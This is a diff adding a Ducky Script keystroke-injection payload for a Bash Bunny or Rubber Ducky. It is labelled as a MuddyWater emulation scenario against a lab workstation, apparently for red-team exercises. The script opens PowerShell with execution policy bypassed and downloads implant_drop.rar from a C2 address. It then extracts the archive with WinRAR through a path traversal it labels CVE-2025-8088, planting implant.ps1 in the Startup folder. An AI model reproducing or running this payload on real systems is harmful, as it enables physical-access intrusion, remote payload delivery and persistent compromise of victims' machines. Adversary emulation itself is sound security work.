@@ -1,0 +1,35 @@
+REM ── SC-004 MUDDYWATER — A01 Phishing + A02 CVE-2025-8088 ───────────────
+REM ── HID Injection Script (Bash Bunny / Rubber Ducky) ────────────────────
+REM ── Target: WS-1 (k.johnson) | C2: 172.16.50.10 ────────────────────────
+
+REM ── Відкрити Chrome → вебпошта ──────────────────
+GUI r
+DELAY 3000
+STRING chrome
+DELAY 1000
+ENTER
+DELAY 10000
+CTRL l
+DELAY 2000
+STRING http://10.10.20.20
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM ── Мінімізуємо Chrome ──────────────────────────
+GUI d
+DELAY 2000
+
+REM ── PowerShell → завантажити implant_drop.rar ───
+GUI r
+DELAY 2000
+STRING powershell -ExecutionPolicy Bypass
+ENTER
+DELAY 4000
+STRINGLN Invoke-WebRequest -Uri 'http://172.16.50.10/implant_drop.rar' -OutFile 'C:\Users\k.johnson\Downloads\implant_drop.rar'
+DELAY 20000
+
+REM ── Розпакувати (CVE-2025-8088 path traversal) ──
+STRINGLN & 'C:\Program Files\WinRAR\WinRAR.exe' x -y 'C:\Users\k.johnson\Downloads\implant_drop.rar' C:\
+DELAY 8000
+STATUS Done - implant.ps1 in Startup
